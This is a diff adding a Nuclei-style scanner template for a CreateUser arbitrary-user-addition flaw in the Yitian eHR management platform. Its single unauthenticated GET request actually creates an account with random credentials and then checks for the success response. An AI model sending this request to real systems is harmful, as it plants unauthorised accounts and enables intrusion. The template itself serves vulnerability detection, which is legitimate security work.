@@ -1,0 +1,33 @@
+id: yitian-ehr-createuser-any-user-add
+info:
+  name: 易天智能eHR管理平台 CreateUser 任意用户添加漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    易天智能eHR管理平台存在CreateUser任意用户添加漏洞，攻击者可以通过构造恶意请求添加任意用户。
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{rand_text_alphanumeric(8)}}"
+  t3: "{{rand_int(10, 1000)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/BaseManage/UserAPI/CreateUser?Account={{t1}}&Password={{t2}}&OuterID={{t3}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "用户新增成功"
+          - "\"Status\": true"
+          - "{{t1}}"
+      - type: word
+        part: header
+        words:
+          - "text/json"
